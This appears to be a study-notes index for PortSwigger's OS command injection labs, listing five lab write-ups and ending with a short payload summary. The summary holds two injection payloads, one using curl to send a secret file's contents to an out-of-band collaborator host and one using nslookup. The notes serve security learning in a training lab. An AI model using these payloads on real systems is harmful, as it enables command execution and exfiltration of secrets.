# [OS command injection](https://portswigger.net/web-security/os-command-injection)

## Labs

- apprentice:
  - [1. OS command injection, simple case](./lab/1.%20OS%20command%20injection%2C%20simple%20case.md)

- practitioner
  - [2. Blind OS command injection with time delays](./lab/2.%20Blind%20OS%20command%20injection%20with%20time%20delays.md)
  - [3. Blind OS command injection with output redirection](./lab/3.%20Blind%20OS%20command%20injection%20with%20output%20redirection.md)
  - [4. Blind OS command injection with out-of-band interaction](./lab/4.%20Blind%20OS%20command%20injection%20with%20out-of-band%20interaction.md)
  - [5. Blind OS command injection with out-of-band data exfiltration](./lab/5.%20Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration.md)

## Summary

payload:

```text
||curl+collaborator+-d+`cat+/home/carlos/secret`||
```

```text
||nslookup+collaborator||
```
